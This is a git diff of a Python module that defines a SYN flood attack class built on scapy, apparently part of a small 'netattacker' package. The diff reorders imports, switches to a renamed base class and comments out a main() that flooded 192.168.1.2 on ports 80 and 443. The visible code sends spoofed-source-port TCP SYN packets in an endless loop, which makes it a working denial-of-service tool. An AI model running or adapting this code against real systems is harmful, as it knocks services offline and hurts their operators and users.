@@ -1,8 +1,9 @@
-from src.attacker import Attacker
+from scapy.all import IP, TCP, RandShort, send
 
-from scapy.all import IP, TCP, send, RandShort
+from netattacker.attacker import AttackerBaseClass
 
-class SynFlooder(Attacker):
+
+class SynFlooder(AttackerBaseClass):
 	"""
 	A class used to represent a SYN flooder
 
@@ -62,13 +63,13 @@ class SynFlooder(Attacker):
 		send(ip/tcp, verbose = False, loop = True)
 
 
-def main():
-	attacker = SynFlooder("192.168.1.2")
-	a = SynFlooder("192.168.1.2", target_ports=[80, 443])
-	a.print_target_ip()
-	a.print_target_ports()
-	a.start()
-	attacker.start()
+# def main():
+# 	attacker = SynFlooder("192.168.1.2")
+# 	a = SynFlooder("192.168.1.2", target_ports=[80, 443])
+# 	a.print_target_ip()
+# 	a.print_target_ports()
+# 	a.start()
+# 	attacker.start()
 
-if __name__ == "__main__":
-	main()
+# if __name__ == "__main__":
+# 	main()
